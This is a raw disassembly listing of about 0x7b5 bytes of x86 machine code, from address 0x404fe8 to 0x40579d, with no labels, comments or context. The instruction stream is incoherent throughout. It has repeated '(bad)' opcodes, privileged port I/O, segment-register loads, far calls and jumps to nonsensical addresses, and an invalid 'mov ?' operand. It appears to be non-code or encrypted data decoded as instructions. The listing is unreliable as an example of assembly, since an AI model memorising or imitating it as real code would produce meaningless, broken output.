  404fe8:	mov    eax,ds:0x7963770a
  404fed:	ficom  DWORD PTR [edx-0x44]
  404ff0:	fist   WORD PTR [ecx-0x62fd08f]
  404ff6:	dec    edx
  404ff7:	dec    esp
  404ff8:	cdq    
  404ff9:	sub    DWORD PTR [ebx+0x2bf9f428],esp
  404fff:	inc    ebp
  405000:	aam    0xfd
  405002:	jl     0x404ff0
  405004:	ss push ecx
  405006:	ins    BYTE PTR es:[edi],dx
  405007:	pop    ebp
  405008:	pop    ds
  405009:	sbb    eax,0xee6efc9e
  40500e:	mov    edx,0x50095053
  405013:	shr    DWORD PTR [ebx+0x591eb4c7],1
  405019:	jp     0x405072
  40501b:	sbb    al,0x6f
  40501d:	pop    edx
  40501e:	and    DWORD PTR [esi-0x20ebce8],0x52b848dc
  405028:	daa    
  405029:	(bad)  [esi-0x55]
  40502c:	test   ah,ch
  40502e:	test   ebx,ebp
  405030:	push   cs
  405031:	lock cmp DWORD PTR [edx],ebp
  405034:	in     eax,dx
  405035:	rcr    BYTE PTR [ecx+0x2d],0x53
  405039:	adc    DWORD PTR [ecx-0x758ab41f],eax
  40503f:	std    
  405040:	adc    al,0x55
  405043:	pop    esp
  405044:	or     ebp,DWORD PTR [esp+ecx*8+0x74]
  405048:	sbb    DWORD PTR [edx],esi
  40504a:	popa   
  40504b:	leave  
  40504c:	xor    edx,DWORD PTR [ebp-0x36]
  40504f:	and    DWORD PTR [esi],0xe725a788
  405055:	push   ebx
  405056:	repz xor esp,DWORD PTR [ecx-0x68]
  40505a:	popf   
  40505b:	and    dl,dh
  40505d:	mov    ch,0xcb
  40505f:	jmp    FWORD PTR [ebx]
  405061:	lds    ecx,FWORD PTR [edx-0x1c]
  405064:	dec    eax
  405065:	xchg   ecx,eax
  405066:	pushf  
  405067:	pop    ss
  405068:	out    dx,al
  405069:	iret   
  40506a:	xor    al,0xe8
  40506c:	fsub   QWORD PTR [ebp-0x7e]
  40506f:	sub    al,0x4
  405071:	stos   DWORD PTR es:[edi],eax
  405072:	shl    DWORD PTR [edi-0x3b],0x1f
  405076:	int    0x9b
  405078:	int    0x7f
  40507a:	jl     0x4050e2
  40507c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40507d:	mov    ecx,0x5353de43
  405082:	pop    ebp
  405083:	pop    eax
  405084:	sbb    edi,0x37
  405087:	mov    ah,0xdd
  405089:	push   esi
  40508a:	add    eax,0x3ef93bd1
  40508f:	dec    edi
  405090:	stc    
  405091:	stos   DWORD PTR es:[edi],eax
  405092:	dec    edi
  405093:	(bad)  
  405094:	sbb    eax,0x67f2edc3
  405099:	std    
  40509a:	xchg   al,ah
  40509c:	inc    ebp
  40509d:	outs   dx,DWORD PTR ds:[esi]
  40509e:	mov    dl,0x26
  4050a0:	lods   al,BYTE PTR ds:[esi]
  4050a1:	xlat   BYTE PTR ds:[ebx]
  4050a2:	jbe    0x405046
  4050a4:	pop    edi
  4050a5:	pop    edx
  4050a6:	add    eax,0xb7ace657
  4050ab:	outs   dx,DWORD PTR ds:[esi]
  4050ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050ad:	sbb    eax,0x755a6aaa
  4050b2:	xchg   ebx,eax
  4050b3:	cmp    al,0xf3
  4050b5:	jnp    0x405071
  4050b7:	dec    edx
  4050b8:	or     eax,0x1c565fef
  4050bd:	retf   0x96a8
  4050c0:	cmc    
  4050c1:	jns    0x405100
  4050c3:	pusha  
  4050c4:	xor    BYTE PTR [esi-0x76cde757],bl
  4050ca:	nop
  4050cb:	dec    eax
  4050cc:	mov    ebp,DWORD PTR [ebp-0x3de0b6e2]
  4050d2:	xor    ebp,DWORD PTR [edx]
  4050d4:	les    eax,FWORD PTR [ebx-0x115c5f46]
  4050da:	cli    
  4050db:	sbb    DWORD PTR [edi-0x1765d235],edi
  4050e1:	xor    al,0xc5
  4050e3:	push   edx
  4050e4:	cmp    dl,BYTE PTR [ecx+ebx*2+0x45bcabd1]
  4050eb:	mov    ecx,0xc97c848e
  4050f0:	sbb    eax,0x9d5f12b5
  4050f5:	call   0xa9a0e11b
  4050fa:	jp     0x4050fe
  4050fc:	push   edi
  4050fd:	shr    BYTE PTR [ecx],cl
  4050ff:	loopne 0x40515a
  405101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405102:	push   esp
  405103:	sub    DWORD PTR [ebx],eax
  405105:	sbb    al,0xf1
  405107:	or     DWORD PTR [ebp-0x770a857c],0x4e
  40510e:	add    esi,ebx
  405110:	push   ss
  405111:	push   ecx
  405112:	jo     0x4050ad
  405114:	pop    ss
  405115:	mov    eax,ds:0x34c66ef8
  40511a:	ja     0x40513f
  40511c:	arpl   WORD PTR [esi-0x2065b645],ax
  405122:	or     edi,DWORD PTR ds:0x75db6f79
  405128:	call   0x32b2:0x4f12d3b0
  40512f:	and    BYTE PTR ds:0x4bf068b9,ah
  405135:	ror    BYTE PTR [edx],cl
  405137:	cmp    DWORD PTR [ebx+0x190d13a7],ecx
  40513d:	jne    0x4051bc
  40513f:	test   DWORD PTR fs:[ebx],ebx
  405142:	sbb    al,0xdf
  405144:	and    al,0x52
  405146:	jb     0x4050f5
  405148:	ja     0x4050e3
  40514a:	das    
  40514b:	dec    esi
  40514c:	add    ebp,eax
  40514e:	sbb    BYTE PTR [edx],0xab
  405151:	test   BYTE PTR [edi],ch
  405153:	dec    ebx
  405154:	inc    ebp
  405155:	std    
  405156:	test   eax,0x435ce398
  40515b:	adc    al,0xad
  40515d:	jg     0x4051bf
  40515f:	dec    esp
  405160:	rcl    BYTE PTR [ecx-0x6cd0f838],1
  405166:	xchg   ecx,eax
  405167:	adc    bl,BYTE PTR [edx+0x74]
  40516a:	or     BYTE PTR [ebp-0x3],0x6b
  40516e:	mov    esi,0x42d01922
  405173:	(bad)  
  405174:	in     eax,0x85
  405176:	pop    ecx
  405177:	xor    ebx,DWORD PTR [edx-0x360a7f57]
  40517d:	bound  ebp,QWORD PTR [esi]
  40517f:	out    dx,eax
  405180:	fcomp  DWORD PTR [edi]
  405182:	add    eax,0xdb1fb2ee
  405187:	mov    dl,0xae
  405189:	popf   
  40518a:	inc    ebp
  40518b:	std    
  40518c:	icebp  
  40518d:	shl    BYTE PTR [eax+0x2d5971bd],1
  405193:	lea    esi,[eax+esi*4-0x765d677]
  40519a:	in     eax,dx
  40519b:	dec    esi
  40519c:	or     cl,BYTE PTR [edx]
  40519e:	mov    ebx,DWORD PTR [ecx]
  4051a0:	pop    ebx
  4051a1:	ret    0x2657
  4051a4:	dec    esi
  4051a5:	or     ecx,DWORD PTR [esp+ecx*8-0x24]
  4051a9:	iret   
  4051aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051ab:	aaa    
  4051ac:	sub    al,0xfb
  4051ae:	ja     0x40514a
  4051b0:	test   al,0x37
  4051b2:	icebp  
  4051b3:	cwde   
  4051b4:	push   ds
  4051b5:	cmp    al,0x5
  4051b7:	sahf   
  4051b8:	inc    edx
  4051b9:	in     al,0xed
  4051bb:	pop    edi
  4051bc:	aaa    
  4051bd:	sti    
  4051be:	lods   al,BYTE PTR ds:[esi]
  4051bf:	mov    WORD PTR [ecx],ss
  4051c1:	sar    DWORD PTR [edi-0x45],0x1d
  4051c5:	pop    ds
  4051c6:	push   edx
  4051c7:	lods   eax,DWORD PTR ss:[esi]
  4051c9:	cwde   
  4051ca:	sub    al,BYTE PTR [esi-0x17]
  4051cd:	addr16 aas 
  4051cf:	or     al,0x92
  4051d1:	mov    eax,ds:0x57761087
  4051d6:	addr16 push esp
  4051d8:	jns    0x4051fc
  4051da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051db:	ret    
  4051dc:	xchg   ebp,eax
  4051dd:	(bad)  
  4051de:	xor    DWORD PTR [edi],ebp
  4051e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051e1:	(bad)  
  4051e2:	lds    ebp,FWORD PTR [esi+0x5]
  4051e5:	dec    esp
  4051e6:	cmp    dl,BYTE PTR [ebx-0x73a421c6]
  4051ec:	out    0x97,eax
  4051ee:	pop    eax
  4051ef:	push   ebx
  4051f0:	out    0x50,al
  4051f2:	in     eax,0x8
  4051f4:	mov    dh,0x17
  4051f6:	inc    esi
  4051f7:	jne    0x4051e7
  4051f9:	sub    edi,0xf2ff6ee1
  4051ff:	ror    DWORD PTR [esi+0x65],cl
  405202:	fwait
  405203:	push   cs
  405204:	mov    bh,0xfd
  405206:	add    esi,esi
  405208:	jle    0x405247
  40520a:	sti    
  40520b:	aas    
  40520c:	pop    ebx
  40520d:	push   ds
  40520e:	cmp    ebp,esi
  405210:	cmp    cl,BYTE PTR [ecx+ebp*4+0x748c0bd9]
  405217:	mov    ah,0xf3
  405219:	mov    ch,0x54
  40521b:	and    esi,DWORD PTR [ebx]
  40521d:	jno    0x40523d
  40521f:	sub    BYTE PTR [ecx+0x1da2a1cb],ah
  405225:	popf   
  405226:	xor    DWORD PTR [edi-0x5d929ee3],esi
  40522c:	push   edx
  40522d:	jb     0x405214
  40522f:	push   eax
  405230:	fstp   TBYTE PTR [edx]
  405232:	sbb    ah,ah
  405234:	leave  
  405235:	aad    0x4a
  405237:	cwde   
  405238:	pop    eax
  405239:	dec    esi
  40523a:	int3   
  40523b:	jns    0x4051c0
  40523d:	iret   
  40523e:	int    0x80
  405240:	lock adc al,0xb2
  405243:	icebp  
  405244:	aaa    
  405245:	mov    dl,0x4c
  405247:	shl    BYTE PTR [ebx-0x55],0x73
  40524b:	mov    ebp,0x2052aae7
  405250:	dec    edx
  405251:	mov    esi,0xd42f8092
  405256:	in     eax,dx
  405257:	jbe    0x4051ee
  405259:	fisttp QWORD PTR [eax-0x9]
  40525c:	sbb    DWORD PTR [ebx],edx
  40525e:	jae    0x405205
  405260:	retf   0xfa5e
  405263:	leave  
  405264:	aaa    
  405265:	add    al,0x2e
  405267:	dec    edi
  405268:	push   0x179e7b1
  40526d:	je     0x4052c3
  40526f:	test   eax,0xd25aa591
  405274:	push   cs
  405275:	std    
  405276:	inc    edx
  405277:	cmp    DWORD PTR [ebx-0x7cf92c95],esp
  40527d:	js     0x40522d
  40527f:	push   ebp
  405280:	daa    
  405281:	cld    
  405282:	xor    DWORD PTR [ebp-0x770237ba],ebp
  405288:	adc    bh,bh
  40528a:	xor    ebp,ecx
  40528c:	fwait
  40528d:	xor    ah,0x9a
  405290:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405291:	in     eax,dx
  405292:	mov    bl,BYTE PTR ds:0x6ea062cf
  405298:	mov    edi,0x66144202
  40529d:	fistp  WORD PTR [eax+0xc207aaa]
  4052a3:	in     al,dx
  4052a4:	std    
  4052a5:	and    al,0x68
  4052a7:	mov    ecx,edx
  4052a9:	inc    ebx
  4052aa:	in     al,dx
  4052ab:	gs pop esi
  4052ad:	and    al,0xf7
  4052af:	push   esp
  4052b0:	jecxz  0x40527f
  4052b2:	clc    
  4052b3:	test   al,0x7b
  4052b5:	or     bl,BYTE PTR [ecx]
  4052b7:	push   0xe8761845
  4052bc:	or     ah,bh
  4052be:	xchg   si,ax
  4052c0:	and    eax,0xa55356a6
  4052c5:	je     0x405260
  4052c7:	cli    
  4052c8:	lods   eax,DWORD PTR ds:[esi]
  4052c9:	cmp    DWORD PTR [edi+0x10a1a704],esi
  4052cf:	fs dec ebx
  4052d1:	dec    edi
  4052d2:	stc    
  4052d3:	push   ss
  4052d4:	daa    
  4052d5:	adc    DWORD PTR [ecx],edi
  4052d7:	jp     0x405344
  4052d9:	fadd   QWORD PTR [edx+0x7badce2a]
  4052df:	jp     0x4052cc
  4052e1:	dec    esp
  4052e2:	mov    ch,0xda
  4052e4:	arpl   WORD PTR [edi+0x5599501a],sp
  4052ea:	push   esp
  4052eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052ec:	sub    edx,esi
  4052ee:	js     0x4052be
  4052f0:	adc    DWORD PTR [edi],0x7d
  4052f3:	(bad)  
  4052f4:	ja     0x4052e0
  4052f6:	add    DWORD PTR [ebp+0x76a234ed],ebx
  4052fc:	scas   eax,DWORD PTR es:[edi]
  4052fd:	lods   al,BYTE PTR ds:[esi]
  4052fe:	jecxz  0x4052d0
  405300:	(bad)  
  405301:	repnz cmp al,0x2e
  405304:	aaa    
  405305:	mov    es,WORD PTR [ebx+ebx*8]
  405308:	inc    esi
  405309:	rcr    BYTE PTR [eax],cl
  40530b:	nop
  40530c:	xchg   ecx,eax
  40530d:	out    dx,al
  40530e:	jmp    0x61954e9b
  405313:	fadd   DWORD PTR [edx+0x49760add]
  405319:	adc    DWORD PTR [ebp+ebp*8+0x27],ebx
  40531d:	or     bh,BYTE PTR cs:[eax+esi*8+0x2e7a9e9]
  405325:	into   
  405326:	lods   al,BYTE PTR ds:[esi]
  405327:	scas   al,BYTE PTR es:[edi]
  405328:	test   al,0x51
  40532a:	mov    dl,0xea
  40532c:	jmp    DWORD PTR ds:0x263abc3d
  405332:	inc    eax
  405333:	stos   BYTE PTR es:[edi],al
  405334:	scas   eax,DWORD PTR es:[edi]
  405335:	xchg   esp,eax
  405336:	es push edx
  405338:	or     ebx,DWORD PTR [ebp+0x323a3d4e]
  40533e:	(bad)  
  40533f:	iret   
  405340:	and    eax,0x94a07f00
  405345:	stos   DWORD PTR es:[edi],eax
  405346:	icebp  
  405347:	xor    eax,0xe009c8d5
  40534c:	push   eax
  40534d:	or     eax,DWORD PTR es:[edx-0x21468c74]
  405354:	outs   dx,BYTE PTR ds:[esi]
  405355:	dec    ecx
  405356:	jp     0x40538f
  405358:	call   0x90186bc6
  40535d:	inc    edi
  40535e:	adc    DWORD PTR [ecx-0x2d8bb19],ebp
  405364:	xor    ecx,esp
  405366:	mov    al,ds:0x279cd811
  40536b:	jnp    0x40538a
  40536d:	xchg   esp,eax
  40536e:	lds    ecx,FWORD PTR [esi-0x32]
  405371:	outs   dx,BYTE PTR ds:[esi]
  405372:	inc    ebp
  405373:	jb     0x40537a
  405375:	mov    eax,ebp
  405377:	test   DWORD PTR [esi+0x79],esp
  40537a:	mov    db3,esi
  40537d:	inc    ebp
  40537e:	cmp    BYTE PTR [ebx+ebx*1+0x3b],ah
  405382:	aaa    
  405383:	push   esp
  405384:	pop    ebp
  405385:	in     eax,0x45
  405387:	mov    eax,0xebffc7f8
  40538c:	and    ebx,DWORD PTR [edx-0x2867ddfe]
  405392:	xor    eax,0x2c47f892
  405397:	push   es
  405398:	(bad)  
  405399:	xlat   BYTE PTR ds:[ebx]
  40539a:	sub    eax,0x507ec264
  40539f:	rcr    DWORD PTR [ebx],0x3
  4053a2:	icebp  
  4053a3:	adc    DWORD PTR [edi-0x102e9fca],0xffffffba
  4053aa:	cmp    BYTE PTR [esi+0x6],bh
  4053ad:	mov    cl,0xa5
  4053af:	scas   al,BYTE PTR es:[edi]
  4053b0:	fadd   st,st(4)
  4053b2:	ja     0x405389
  4053b4:	fst    DWORD PTR [edx+0x79]
  4053b7:	fistp  WORD PTR [ebp-0x3a]
  4053ba:	ins    BYTE PTR es:[edi],dx
  4053bb:	loopne 0x40535b
  4053bd:	ret    0x3e1d
  4053c0:	mov    bh,0x94
  4053c2:	scas   eax,DWORD PTR es:[edi]
  4053c3:	das    
  4053c4:	mov    dh,0xda
  4053c6:	inc    edi
  4053c7:	and    BYTE PTR [ebp+ebp*4-0x25],bl
  4053cb:	jle    0x405391
  4053cd:	aaa    
  4053ce:	cmp    eax,0x9368628a
  4053d3:	dec    esp
  4053d4:	push   edi
  4053d5:	mov    eax,0x8f266450
  4053da:	push   ecx
  4053db:	retf   
  4053dc:	js     0x405366
  4053de:	das    
  4053df:	loope  0x4053fe
  4053e1:	pop    edx
  4053e2:	mov    DWORD PTR [edi],ecx
  4053e4:	push   ss
  4053e5:	dec    edx
  4053e6:	or     BYTE PTR [ebp+0x105fa275],al
  4053ec:	dec    eax
  4053ed:	inc    eax
  4053ee:	ficom  DWORD PTR [eax+ebx*1-0xf3a7e6a]
  4053f5:	mov    cs,WORD PTR [ecx]
  4053f7:	sub    BYTE PTR [ecx],0xd6
  4053fa:	fcomp  QWORD PTR [esi+eiz*1+0x7]
  4053fe:	or     ecx,ebp
  405400:	mov    al,ds:0xe7eed763
  405405:	xor    cl,BYTE PTR [ecx-0x46]
  405408:	push   eax
  405409:	cdq    
  40540a:	(bad)  
  40540b:	outs   dx,DWORD PTR ds:[esi]
  40540c:	out    dx,al
  40540d:	loop   0x405400
  40540f:	mov    ecx,0x3d5d1825
  405414:	pop    esi
  405415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405416:	inc    ebx
  405417:	dec    DWORD PTR [ebp+0x545ace75]
  40541d:	cmp    al,0xf3
  40541f:	outs   dx,BYTE PTR ds:[esi]
  405420:	pop    esi
  405421:	cmp    BYTE PTR [edx+eax*8],al
  405424:	jge    0x4053ce
  405426:	inc    ecx
  405427:	in     eax,dx
  405428:	(bad)  
  405429:	inc    DWORD PTR [esi-0xd]
  40542c:	xchg   DWORD PTR [ebx+0x22],esi
  40542f:	repnz rcl al,1
  405432:	push   edi
  405433:	mov    eax,0xdc3ace53
  405438:	fbld   TBYTE PTR [edx+esi*1-0x57d0ee12]
  40543f:	xchg   ecx,eax
  405440:	jl     0x405427
  405442:	and    DWORD PTR [edx+0x58],edx
  405445:	xor    DWORD PTR [ebx+0x1f5c29cd],ebx
  40544b:	scas   eax,DWORD PTR es:[edi]
  40544c:	pop    ebx
  40544d:	lods   al,BYTE PTR gs:[esi]
  40544f:	retf   
  405450:	and    BYTE PTR [edx+0x76],bh
  405453:	pop    edx
  405454:	mov    edx,0x24d75c0a
  405459:	cmp    edi,DWORD PTR [esi]
  40545b:	inc    ebp
  40545c:	aas    
  40545d:	rcl    DWORD PTR [edi],1
  40545f:	jle    0x4054e0
  405461:	cli    
  405462:	ins    DWORD PTR es:[edi],dx
  405463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405464:	cwde   
  405465:	mov    al,ds:0x83069bd4
  40546a:	hlt    
  40546b:	out    0x56,al
  40546d:	add    esi,DWORD PTR [ecx+0x29]
  405470:	xchg   ebx,eax
  405471:	fimul  WORD PTR [ebx]
  405473:	outs   dx,DWORD PTR ds:[esi]
  405474:	cmc    
  405475:	xchg   edx,eax
  405476:	cld    
  405477:	pop    esi
  405478:	pop    esi
  405479:	cmp    eax,DWORD PTR [ebp-0x5]
  40547c:	aas    
  40547d:	cli    
  40547e:	arpl   WORD PTR [esi],sp
  405480:	add    eax,ecx
  405482:	adc    DWORD PTR [ebx-0x4],0x6117e14e
  405489:	pop    esp
  40548a:	push   cs
  40548b:	and    DWORD PTR [edx-0x5585ee17],esp
  405491:	fs pop ecx
  405493:	mov    edi,0x2ccdc745
  405498:	dec    esi
  405499:	inc    edx
  40549a:	cdq    
  40549b:	jp     0x4054b7
  40549d:	jmp    0x7f2:0xc739620b
  4054a4:	xchg   edx,eax
  4054a5:	lock (bad) 
  4054a7:	mov    eax,ds:0x548801a8
  4054ac:	sahf   
  4054ad:	pop    edi
  4054ae:	and    edi,DWORD PTR [edx+0x6ffec62f]
  4054b4:	cmp    edx,edi
  4054b6:	mov    bl,0x1a
  4054b8:	(bad)  
  4054ba:	data16 cmp BYTE PTR [edx],bl
  4054bd:	sahf   
  4054be:	xor    ch,bh
  4054c0:	cld    
  4054c1:	div    DWORD PTR [esi]
  4054c3:	(bad)  
  4054c4:	clc    
  4054c5:	and    al,0x32
  4054c7:	mov    esi,0xee5dfff4
  4054cc:	icebp  
  4054cd:	inc    esp
  4054ce:	mov    dh,0x88
  4054d0:	xor    eax,0x101783bb
  4054d5:	sbb    al,BYTE PTR [edx-0x3f]
  4054d8:	(bad)  
  4054d9:	bound  ebp,QWORD PTR [esi]
  4054db:	inc    esi
  4054dc:	mov    dl,0xce
  4054df:	mov    ds:0x98302e04,al
  4054e4:	inc    ebp
  4054e5:	cmc    
  4054e6:	test   BYTE PTR [esi+0x6c],bl
  4054e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054ea:	adc    eax,0xd7d6b728
  4054ef:	xchg   esp,eax
  4054f0:	(bad)  
  4054f2:	cmp    BYTE PTR [edx],0x3
  4054f5:	idiv   DWORD PTR [edi-0x5208aed0]
  4054fb:	mov    dl,0xc6
  4054fd:	dec    ebp
  4054fe:	xor    edx,DWORD PTR [esi+0xbea4f00]
  405504:	xor    DWORD PTR [edx+0x5931bc2a],ebx
  40550a:	xor    al,0xc6
  40550c:	add    BYTE PTR [eax-0x41a1fd9a],ah
  405512:	bound  esi,QWORD PTR [esi+0x41]
  405515:	add    cl,BYTE PTR [esi+0x1852c5c1]
  40551b:	mov    ebp,0xdf3bf278
  405520:	mov    dh,0x33
  405522:	jnp    0x4055a3
  405524:	pop    ebx
  405525:	cmp    eax,0x2c7dda59
  40552a:	mov    esp,0x23c3cc8b
  40552f:	ss mov esi,0xf9088b9d
  405535:	repz sbb edi,ebp
  405538:	xchg   esi,eax
  405539:	cmc    
  40553a:	fst    QWORD PTR [ebx-0x37376f7a]
  405540:	es and eax,ebx
  405543:	add    DWORD PTR [ebp+0x15024109],esi
  405549:	(bad)  
  40554b:	xlat   BYTE PTR ds:[ebx]
  40554c:	pusha  
  40554d:	daa    
  40554e:	aam    0xf6
  405550:	sbb    al,0x51
  405552:	pop    ds
  405553:	loope  0x405525
  405555:	pop    eax
  405556:	js     0x40556b
  405558:	mov    esp,0xb17e509a
  40555d:	icebp  
  40555e:	cmp    DWORD PTR [eax+0x593c69dd],edi
  405564:	sbb    bh,0xe5
  405567:	out    0xff,al
  405569:	mov    ecx,DWORD PTR [edi-0x72352b14]
  40556f:	or     eax,0x245c8dff
  405574:	test   ch,ah
  405576:	sbb    ch,ah
  405578:	pop    ss
  405579:	test   al,0xe7
  40557b:	lahf   
  40557c:	adc    eax,0xbc8700e0
  405581:	int    0x48
  405583:	in     eax,dx
  405584:	call   0x5c9:0x94923898
  40558b:	pop    edi
  40558c:	xchg   esi,eax
  40558d:	inc    esp
  40558e:	mov    esp,DWORD PTR [ecx+0x7851bd3d]
  405594:	xchg   esp,eax
  405595:	pop    ss
  405596:	dec    edi
  405597:	mov    bl,bh
  405599:	(bad)  [ecx+0x35]
  40559c:	in     eax,dx
  40559d:	repz adc ecx,ebp
  4055a0:	cs xchg ecx,eax
  4055a2:	hlt    
  4055a3:	fs retf 
  4055a5:	gs loopne 0x4055b7
  4055a8:	into   
  4055a9:	rol    edx,0x1
  4055ac:	cmp    al,0xcf
  4055ae:	jo     0x4055bc
  4055b0:	imul   DWORD PTR [edx-0x6ed222eb]
  4055b6:	xchg   BYTE PTR [ebp-0x50d66cc4],ah
  4055bc:	scas   eax,DWORD PTR es:[edi]
  4055bd:	mov    esp,0x5069bd94
  4055c2:	dec    edi
  4055c3:	out    dx,al
  4055c4:	or     ecx,edx
  4055c6:	ret    0x80fc
  4055c9:	push   0x1e
  4055cb:	(bad)  
  4055cc:	call   0x5ced3c79
  4055d1:	push   ecx
  4055d2:	imul   eax,ebx,0x29
  4055d5:	in     al,0x5f
  4055d7:	dec    eax
  4055d8:	out    dx,al
  4055d9:	jl     0x4055e7
  4055db:	pop    eax
  4055dc:	sbb    BYTE PTR [ebx+0x5f],0x98
  4055e0:	aas    
  4055e1:	add    cl,ch
  4055e3:	add    BYTE PTR ds:0xb1df3923,0x84
  4055ea:	in     eax,dx
  4055eb:	not    DWORD PTR [edi+0x3c]
  4055ee:	btc    DWORD PTR [edi+0x2e],edx
  4055f2:	jnp    0x40562a
  4055f4:	sahf   
  4055f5:	jmp    0x405627
  4055f7:	push   ebx
  4055f8:	mov    cl,0x36
  4055fa:	in     al,dx
  4055fb:	xchg   esp,eax
  4055fc:	sub    DWORD PTR [ecx-0x4e],eax
  4055ff:	add    al,0x8b
  405601:	shl    DWORD PTR [eax+eax*1],1
  405604:	adc    bl,dh
  405606:	add    edi,DWORD PTR [eax+eax*1+0x7866e2d8]
  40560d:	sbb    eax,0xdbdacc28
  405612:	not    DWORD PTR [edi]
  405614:	cdq    
  405615:	inc    ecx
  405616:	xchg   edx,eax
  405617:	cdq    
  405618:	jns    0x4055a8
  40561a:	dec    eax
  40561b:	popa   
  40561c:	iret   
  40561d:	sbb    DWORD PTR [ebp+0x33],esp
  405620:	dec    ebp
  405621:	sub    ebp,DWORD PTR [edi]
  405623:	sar    DWORD PTR [edi+eiz*2-0x2a],0x8a
  405628:	cmp    DWORD PTR [ebx-0x127fffdc],ebp
  40562e:	mov    cl,0xc
  405630:	sub    eax,0x315604be
  405635:	out    0x80,eax
  405637:	stos   DWORD PTR es:[edi],eax
  405638:	mov    ds:0xcd22852e,al
  40563d:	and    eax,0x10e28792
  405642:	push   0xffffff94
  405644:	xor    eax,eax
  405646:	push   es
  405647:	enter  0xf324,0x6f
  40564b:	loopne 0x4055d5
  40564d:	shl    DWORD PTR [eax+0x4e8a7304],cl
  405653:	aaa    
  405654:	stc    
  405655:	fcmovb st,st(7)
  405657:	aas    
  405658:	add    DWORD PTR [esi-0x2f],0x54bb6977
  40565f:	jp     0x405627
  405661:	jnp    0x40568d
  405663:	sbb    ebx,DWORD PTR [edi+0x31]
  405666:	mov    eax,0x18cca766
  40566b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40566c:	nop
  40566d:	imul   BYTE PTR [ebx]
  40566f:	and    al,0x53
  405671:	mov    esp,0x92ec1767
  405676:	mov    eax,ds:0xd8431bcf
  40567b:	es dec ecx
  40567d:	and    cl,BYTE PTR [ebp+0x65070f6b]
  405683:	mov    ?,WORD PTR [edi]
  405685:	add    al,0x26
  405687:	(bad)  
  405688:	clc    
  405689:	ror    DWORD PTR [ebx],0x39
  40568c:	dec    esp
  40568d:	stc    
  40568e:	dec    ecx
  40568f:	mov    bh,0xe3
  405691:	xchg   edi,eax
  405692:	pop    ebx
  405693:	scas   eax,DWORD PTR es:[edi]
  405694:	leave  
  405695:	push   ebx
  405696:	jno    0x405670
  405698:	or     eax,0xb3a77010
  40569d:	hlt    
  40569e:	mov    cl,0xdd
  4056a0:	xchg   edi,eax
  4056a1:	inc    ecx
  4056a2:	pop    ds
  4056a3:	clc    
  4056a4:	dec    esp
  4056a5:	and    eax,0xf940243e
  4056aa:	push   ebp
  4056ab:	cmp    eax,DWORD PTR [ecx+0x6e2f502f]
  4056b1:	ins    BYTE PTR es:[edi],dx
  4056b2:	jne    0x405688
  4056b4:	lds    ebx,FWORD PTR [eax+eiz*1-0x41]
  4056b8:	out    0x95,eax
  4056ba:	cmp    al,0xfc
  4056bc:	mov    DWORD PTR [edx],edi
  4056be:	mov    cl,0x48
  4056c0:	das    
  4056c1:	arpl   WORD PTR [edx+eiz*4],si
  4056c4:	rol    DWORD PTR [eax+0xe],1
  4056c7:	mov    ds:0xc8591714,eax
  4056cc:	sbb    eax,0x22408f53
  4056d1:	mov    ds:0x590a42de,al
  4056d6:	mov    ds:0x46ea31c3,al
  4056db:	adc    eax,0x7b7f796f
  4056e0:	adc    al,al
  4056e2:	int    0x47
  4056e4:	xchg   ebx,eax
  4056e5:	adc    eax,0xaa7070af
  4056ea:	add    cl,0x83
  4056ed:	ss inc ebx
  4056ef:	adc    DWORD PTR [edi+0x27],ebx
  4056f2:	cmp    eax,0x3db0a35
  4056f7:	daa    
  4056f8:	out    0x50,eax
  4056fa:	mov    edx,0x124d6e19
  4056ff:	mov    cs,WORD PTR [esi]
  405701:	adc    DWORD PTR [eax],esi
  405703:	fcmovu st,st(3)
  405705:	fisttp QWORD PTR [eax]
  405707:	mov    bl,0xd1
  405709:	out    0x1f,eax
  40570b:	push   ecx
  40570c:	aam    0x3c
  40570e:	ins    BYTE PTR es:[edi],dx
  40570f:	cmp    cl,al
  405711:	add    DWORD PTR [bp+di-0x7e],ebp
  405715:	mov    eax,0xd673ea4f
  40571a:	imul   edx,DWORD PTR [ecx],0x4f
  40571d:	pop    esp
  40571e:	imul   esp,DWORD PTR [edi+0x49f294c6],0xffffffe4
  405725:	test   BYTE PTR [ecx],bh
  405727:	mov    esi,0x1dbe7c4d
  40572c:	inc    edx
  40572d:	pop    eax
  40572e:	and    BYTE PTR [ecx+eax*4-0x6d7be489],0xbe
  405736:	inc    edx
  405737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405738:	adc    dh,ch
  40573a:	mov    edi,0xdea78e22
  40573f:	jg     0x4056e5
  405741:	(bad)  
  405742:	dec    edi
  405743:	cmovl  edi,DWORD PTR [ebx-0x18bd73a4]
  40574a:	hlt    
  40574b:	mov    cl,0xd1
  40574d:	mov    al,ds:0x4306cc8
  405752:	push   0xa552ad81
  405757:	int3   
  405758:	lods   eax,DWORD PTR ds:[esi]
  405759:	into   
  40575a:	add    BYTE PTR [edx+0x2d086f6d],ah
  405760:	mov    ebp,cs
  405762:	ins    BYTE PTR es:[edi],dx
  405763:	cmc    
  405764:	push   ecx
  405765:	mov    eax,0x3afa2dc2
  40576a:	jmp    0x40579f
  40576c:	jb     0x4057dd
  40576e:	addr16 std 
  405770:	std    
  405771:	push   cs
  405772:	imul   DWORD PTR [eax-0x72]
  405775:	mov    bh,0x71
  405777:	xchg   ebp,eax
  405778:	mov    al,0x8
  40577a:	inc    ecx
  40577b:	mov    cs,WORD PTR [ecx-0x71]
  40577e:	fsubr  st(6),st
  405780:	pop    ecx
  405781:	mov    al,ds:0x1641919
  405786:	cmp    BYTE PTR [ebp-0x6ad67325],0xd2
  40578d:	or     BYTE PTR [esi],bh
  40578f:	leave  
  405790:	add    BYTE PTR [esp+edx*8+0x28],cl
  405794:	cli    
  405795:	nop
  405796:	ffree  st(5)
  405798:	mov    edi,0x2468c201
  40579d:	out    dx,al
